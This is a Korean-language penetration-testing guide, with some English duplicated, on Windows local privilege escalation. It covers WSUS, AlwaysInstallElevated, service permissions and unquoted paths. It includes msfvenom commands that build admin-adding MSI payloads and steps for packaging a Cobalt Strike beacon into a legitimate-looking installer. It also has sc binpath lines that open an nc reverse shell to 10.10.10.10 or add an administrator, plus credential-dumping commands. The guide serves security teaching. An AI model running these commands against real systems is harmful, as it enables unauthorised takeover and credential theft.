# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 integrity levels가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템 열거를 방해하거나 실행 파일 실행을 막거나 심지어 활동을 탐지할 수 있는 여러 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 페이지를 읽고 이러한 모든 방어 메커니즘을 열거해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Windows 버전에 알려진 취약점이 있는지 확인하세요 (적용된 패치도 함께 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 익스플로잇

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색할 때 유용합니다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 등록되어 있으며, 이는 Windows 환경이 제공하는 **거대한 공격 표면**을 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**익스플로잇 Github 리포지토리:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

env variables에 자격증명/민감한 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 트랜스크립트 파일

이 기능을 켜는 방법은 다음에서 확인할 수 있습니다: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 정보가 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 다만 전체 실행 세부 정보와 출력 결과는 모두 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르고, **"Module Logging"** 대신 **"Powershell Transcription"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell 로그의 마지막 15개 이벤트를 보려면 다음을 실행하세요:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 모든 활동과 전체 콘텐츠 기록이 캡처되어, 코드의 각 블록이 실행되는 순간마다 문서화됩니다. 이 과정은 각 활동에 대한 포괄적인 감사 추적을 보존하여 포렌식 및 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block에 대한 로깅 이벤트는 Windows 이벤트 뷰어의 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
최근 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http로 요청되는 경우 시스템을 침해할 수 있습니다.

다음 명령을 cmd에서 실행하여 네트워크가 non-SSL WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음과 같이:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 의 값이 `1`이라면.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

그러면, **악용 가능합니다.** 마지막 레지스트리 값이 0이면 WSUS 항목은 무시됩니다.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

이 취약점을 악용하려면 다음과 같은 도구를 사용할 수 있습니다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - 이들은 MiTM로 무기화된 익스플로잇 스크립트로 non-SSL WSUS 트래픽에 '가짜' 업데이트를 주입합니다.

Read the research here:

연구는 다음에서 확인하세요:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
[**전체 보고서는 여기서 읽어보세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

기본적으로 이 버그가 악용하는 결함은 다음과 같습니다:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> 로컬 사용자 프록시를 수정할 수 있는 권한이 있고 Windows Updates가 Internet Explorer 설정에 구성된 프록시를 사용한다면, 우리는 로컬에서 [PyWSUS](https://github.com/GoSecure/pywsus)를 실행해 자신의 트래픽을 가로채고 자산에서 권한 상승된 사용자로서 코드를 실행할 수 있습니다.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
>
> 또한 WSUS 서비스는 현재 사용자의 설정을 사용하므로 해당 사용자의 인증서 저장소도 사용합니다. WSUS 호스트명에 대한 자체 서명 인증서를 생성하여 이를 현재 사용자의 인증서 저장소에 추가하면 HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있습니다. WSUS는 인증서에 대해 trust-on-first-use 유형의 검증을 구현하는 HSTS와 유사한 메커니즘을 사용하지 않습니다. 제시된 인증서가 사용자가 신뢰하고 올바른 호스트명을 포함하면 서비스에서 이를 수락합니다.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

이 취약점은 도구 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (공개되면)를 사용해 악용할 수 있습니다.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:

많은 엔터프라이즈 에이전트는 localhost IPC 인터페이스와 권한 있는 업데이트 채널을 노출합니다. 등록(enrollment)이 공격자 서버로 유도될 수 있고 업데이트 프로그램이 악성 루트 CA나 취약한 서명 검증을 신뢰하면, 로컬 사용자는 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다. 일반화된 기법(Netskope stAgentSvc 체인 기반 – CVE-2025-0309)은 다음을 참조하세요:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

특정 조건에서 Windows **domain** 환경에는 **로컬 권한 상승(local privilege escalation)** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing이 강제되지 않는** 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)**를 구성할 수 있는 자체 권한(self-rights)을 보유한 경우, 그리고 사용자가 도메인 내에 컴퓨터를 생성할 수 있는 능력이 포함됩니다. 이 **요구사항들**은 기본 설정으로도 충족된다는 점에 유의해야 합니다.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

익스플로잇은 다음에서 찾을 수 있습니다: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

공격 흐름에 대한 자세한 내용은 다음을 확인하세요: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.

이 두 레지스트리 항목이 **활성화(값이 0x1)** 되어 있으면, 모든 권한 수준의 사용자가 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **설치(실행)** 할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

현재 디렉터리 안에 권한 상승용 Windows MSI 바이너리를 생성하려면 power-up의 `Write-UserAddMSI` 명령을 사용하세요. 이 스크립트는 사용자/그룹 추가를 묻는 사전 컴파일된 MSI 설치 프로그램을 출력합니다(따라서 GIU 접근 권한이 필요합니다):
```
Write-UserAddMSI
```
생성된 바이너리를 실행하기만 하면 권한을 상승시킬 수 있습니다.

### MSI Wrapper

이 튜토리얼을 읽어 MSI wrapper를 만드는 방법을 배우세요. 참고로, **.bat** 파일을 래핑할 수 있으며, **단지** **명령줄을** **실행**하려는 경우에 적합합니다


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 **new Windows EXE TCP payload**를 **생성**하세요
- **Visual Studio**를 열고, **Create a new project**를 선택한 뒤 검색 상자에 "installer"를 입력하세요. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭하세요.
- 프로젝트 이름을 예: **AlwaysPrivesc**로 지정하고, 위치로 **`C:\privesc`**를 사용하세요. **place solution and project in the same directory**를 선택하고 **Create**를 클릭하세요.
- 포함할 파일을 선택하는 4단계 중 3단계에 도달할 때까지 **Next**를 계속 클릭하세요. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택한 다음 **Finish**를 클릭하세요.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택하고, **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경하세요.
- 설치된 앱을 더 정당하게 보이게 하기 위해 **Author**, **Manufacturer** 같은 다른 속성들도 변경할 수 있습니다.
- 프로젝트를 우클릭하고 **View > Custom Actions**를 선택하세요.
- **Install**을 우클릭하고 **Add Custom Action**을 선택하세요.
- **Application Folder**를 더블클릭하고, **beacon.exe** 파일을 선택한 다음 **OK**를 클릭하세요. 이렇게 하면 인스톨러가 실행되면 즉시 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경하세요.
- 마지막으로 **빌드**하세요.
- 경고 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`가 표시되면 플랫폼을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 `.msi` 파일의 **설치**를 **백그라운드**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정은 어떤 항목이 **로그에 기록되는지** 결정하므로 주의해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아보는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 암호의 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 암호가 **고유하고 무작위이며 정기적으로 갱신되도록** 보장합니다. 이러한 암호는 Active Directory 내에 안전하게 저장되며, ACL을 통해 충분한 권한이 부여된 사용자만이 로컬 관리자 암호를 확인할 수 있습니다.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우 **plain-text passwords는 LSASS (Local Security Authority Subsystem Service)에 저장됩니다**.\

[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대해 향상된 보호를 도입하여, 신뢰되지 않은 프로세스가 메모리를 **읽으려는** 시도나 코드를 주입하려는 시도를 **차단**함으로써 시스템 보안을 강화했습니다.\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에 도입되었습니다. 이 기능의 목적은 장치에 저장된 credentials를 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에 의해 사용됩니다. 사용자의 로그온 데이터가 등록된 security package에 의해 인증되면, 해당 사용자에 대한 domain credentials가 일반적으로 설정됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

소속된 그룹 중 권한이 흥미로운 그룹이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

만약 당신이 **어떤 특권 그룹에 속해 있다면 권한 상승이 가능할 수 있습니다**. 여기에서 특권 그룹과 이를 악용해 권한을 상승시키는 방법을 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**더 알아보기**: 이 페이지에서 **token**이 무엇인지 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 token들에 대해 알아보고** 이를 악용하는 방법을 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인된 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 Processes

### 파일 및 폴더 권한

먼저, 프로세스를 나열하여 **process의 command line 안에 passwords가 있는지 확인하세요**.\
실행 중인 일부 **overwrite some binary running**을 할 수 있는지, 또는 binary 폴더에 write 권한이 있어 잠재적인 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 [**electron/cef/chromium debuggers**가 실행 중인지 확인하세요, 이를 악용해 권한을 상승시킬 수 있습니다](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 binaries의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

실행 중인 프로세스의 메모리 덤프는 sysinternals의 **procdump**를 사용해 만들 수 있습니다. FTP 같은 서비스는 **credentials in clear text in memory**를 가지고 있는 경우가 있으니, 메모리를 덤프하여 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있도록 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭

## 서비스

Service Triggers은 특정 조건이 발생할 때 Windows가 서비스를 시작하도록 합니다 (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh 등). SERVICE_START 권한이 없어도 트리거를 발생시켜 종종 권한 있는 서비스를 시작할 수 있습니다. 열거 및 활성화 기법은 다음을 참조하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록을 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스 정보를 얻으려면 **sc**를 사용할 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우 (예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음 명령을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**이 문제의 또 다른 우회 방법은 다음을 실행하는 것입니다:**
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

서비스에 대해 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 가진 경우, 서비스의 실행 바이너리를 수정할 수 있습니다. 서비스를 수정하고 실행하기 위해 **sc**를 사용합니다:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하여 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성을 변경할 수 있는 능력을 상속합니다.
- **GENERIC_ALL**: 역시 서비스 구성 변경 능력을 상속합니다.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**서비스가 실행하는 바이너리를 수정할 수 있는지** 또는 바이너리가 위치한 폴더에 **쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html)).\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
서비스 **레지스트리**에 대한 **권한**을 **확인**하려면 다음과 같이:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스가 실행하는 바이너리를 변경할 수 있습니다.

서비스가 실행하는 바이너리의 경로를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 서비스 레지스트리 AppendData/AddSubdirectory 권한

이 권한이 레지스트리에 있으면 **이 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**. Windows 서비스의 경우 이것만으로도 **임의 코드를 실행하기에 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 따옴표 없는 서비스 경로

실행 파일 경로가 따옴표로 묶여 있지 않으면, Windows는 공백 이전의 모든 경로들을 순서대로 실행하려 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_ 의 경우 Windows는 다음을 실행하려 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장된 Windows 서비스에 속하지 않는 항목을 제외하고, 인용되지 않은 모든 서비스 경로를 나열:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
